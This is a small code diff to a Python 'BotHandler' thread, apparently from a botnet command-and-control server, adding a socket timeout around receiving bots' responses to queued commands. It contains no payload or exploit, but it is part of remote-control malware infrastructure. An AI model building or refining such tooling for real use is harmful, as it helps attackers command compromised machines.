@@ -80,8 +80,12 @@ class BotHandler(threading.Thread):
                 RecvBotCmd = self.q.get()
                 try:
                     self.client.send(RecvBotCmd.encode('utf-8'))
-                    resp = self.client.recv(1024).decode('utf-8')
-                    print("[+] {} reponse: {}".format(BotName, resp))
+                    self.client.settimeout(1)
+                    try:
+                        resp = self.client.recv(1024).decode('utf-8')
+                        print("[+] {} reponse: {}".format(BotName, resp))
+                    except:
+                        continue
                 except Exception as ex:
                     print("Exception occured during command sending: {}".format(ex))
                     break
